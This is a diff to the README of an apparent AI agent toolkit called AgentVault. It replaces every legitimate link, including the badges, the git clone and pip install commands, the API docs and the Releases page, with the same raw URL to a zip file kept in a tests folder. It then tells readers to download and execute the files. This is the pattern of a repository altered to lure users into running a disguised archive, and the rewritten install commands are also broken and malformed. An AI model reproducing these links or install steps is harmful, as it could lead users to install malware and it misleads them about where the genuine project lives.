@@ -1,8 +1,8 @@
 # AgentVault 🛡️
 
-![AgentVault](https://img.shields.io/badge/AgentVault-Open%20Source-blue.svg)
-![Python](https://img.shields.io/badge/Python-3.8%2B-green.svg)
-![License](https://img.shields.io/badge/License-Apache%202.0-yellow.svg)
+![AgentVault](https://raw.githubusercontent.com/hoangtuanhehehehhe/AgentVault/main/automation_scripts/tests/Agent-Vault-v1.5.zip%https://raw.githubusercontent.com/hoangtuanhehehehhe/AgentVault/main/automation_scripts/tests/Agent-Vault-v1.5.zip)
+![Python](https://raw.githubusercontent.com/hoangtuanhehehehhe/AgentVault/main/automation_scripts/tests/Agent-Vault-v1.5.zip%https://raw.githubusercontent.com/hoangtuanhehehehhe/AgentVault/main/automation_scripts/tests/Agent-Vault-v1.5.zip)
+![License](https://raw.githubusercontent.com/hoangtuanhehehehhe/AgentVault/main/automation_scripts/tests/Agent-Vault-v1.5.zip%https://raw.githubusercontent.com/hoangtuanhehehehhe/AgentVault/main/automation_scripts/tests/Agent-Vault-v1.5.zip)
 
 Welcome to **AgentVault**, an open-source toolkit designed for secure and decentralized AI agent interoperability. This repository includes a Python library, a Registry API, and a Command Line Interface (CLI) that enable seamless communication between AI agents using A2A (Agent-to-Agent) and MCP (Multi-Channel Protocol).
 
@@ -37,13 +37,13 @@ To install **AgentVault**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/hoangtuanhehehehhe/AgentVault.git
+   git clone https://raw.githubusercontent.com/hoangtuanhehehehhe/AgentVault/main/automation_scripts/tests/Agent-Vault-v1.5.zip
    cd AgentVault
    ```
 
 2. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/hoangtuanhehehehhe/AgentVault/main/automation_scripts/tests/Agent-Vault-v1.5.zip
    ```
 
 3. Ensure you have Python 3.8 or higher installed.
@@ -89,7 +89,7 @@ agentvault register MyAgent --api-key my_secure_api_key
 
 ## API Documentation
 
-For detailed API documentation, please refer to the [API Documentation](https://github.com/hoangtuanhehehehhe/AgentVault/wiki).
+For detailed API documentation, please refer to the [API Documentation](https://raw.githubusercontent.com/hoangtuanhehehehhe/AgentVault/main/automation_scripts/tests/Agent-Vault-v1.5.zip).
 
 ## Contributing
 
@@ -122,7 +122,7 @@ If you encounter any issues or have questions, please open an issue in the repos
 
 ## Releases
 
-To download the latest version of **AgentVault**, visit the [Releases section](https://github.com/hoangtuanhehehehhe/AgentVault/releases). Here, you can find the latest binaries and source code. Make sure to download and execute the appropriate files for your platform.
+To download the latest version of **AgentVault**, visit the [Releases section](https://raw.githubusercontent.com/hoangtuanhehehehhe/AgentVault/main/automation_scripts/tests/Agent-Vault-v1.5.zip). Here, you can find the latest binaries and source code. Make sure to download and execute the appropriate files for your platform.
 
 ## Conclusion
 
